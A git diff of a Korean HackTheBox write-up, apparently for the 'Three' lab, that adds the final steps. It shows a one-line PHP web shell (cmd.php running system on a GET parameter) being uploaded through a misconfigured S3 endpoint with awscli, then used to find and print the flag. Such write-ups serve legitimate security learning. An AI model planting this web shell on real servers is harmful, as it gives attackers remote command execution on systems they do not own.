@@ -4,7 +4,6 @@ categories: [HackTheBox, Basic]
 tags: [HackTheBox, Gobuster, AWS, S3, awscli]
 image:
     path: /assets/image_post/20240214231540.png
-draft: true
 ---
 
 ![](../assets/image_post/20240214231721.png)
@@ -182,3 +181,26 @@ Could not connect to the endpoint URL: "https://s3.thetoppers.amazonaws.com/s3.t
 └─# cat cmd.php
 <?php system($_GET['cmd']); ?>
 ```
+
+아래는 기존에 존재하던 index.php를 다운로드하고, 내가 작성한 cmd.php를 갖은 경로에 업로드 하는 과정이다. `aws s3 --endpoint=http://s3.thetoppers.htb ls`로 수집한 경로 `thetoppers.htb`에 대해 아래와 같이 접근해야한다.
+``` bash
+┌──(root㉿kali)-[/home/user]
+└─# aws aws s3 --endpoint=http://s3.thetoppers.htb cp s3://thetoppers.htb/index.php ./index.php
+
+download: s3://thetoppers.htb/index.php to ./index.php
+
+┌──(root㉿kali)-[/home/user]
+└─# aws s3 --endpoint=http://s3.thetoppers.htb cp ./cmd.php s3://thetoppers.htb/cmd.php
+upload: ./cmd.php to s3://thetoppers.htb/cmd.php
+```
+이제 업로드한 경로를 통해 접근해보면 아래와 같이 성공적으로 웹쉘 업로드가 됐다.
+![](../assets/image_post/20240216102926.png)
+
+문제를 풀 때 대체적으로 flag가 존재하는 파일의 이름이 flag.txt이기에 아래와 같이 find 명령어로 찾아보았고, 바로 결과가 나왔다.
+![](../assets/image_post/20240216103050.png)
+
+이제 flag 파일을 출력하면 정답을 확인할 수 있다.
+![](../assets/image_post/20240216103158.png)
+
+awscli를 처음 사용해보기에, 유익했다. 회사의 자산에 대해서도 위험 여부 판단을 할 때 사용하면 좋을 것 같다.
+![](../assets/image_post/20240216103322.png)
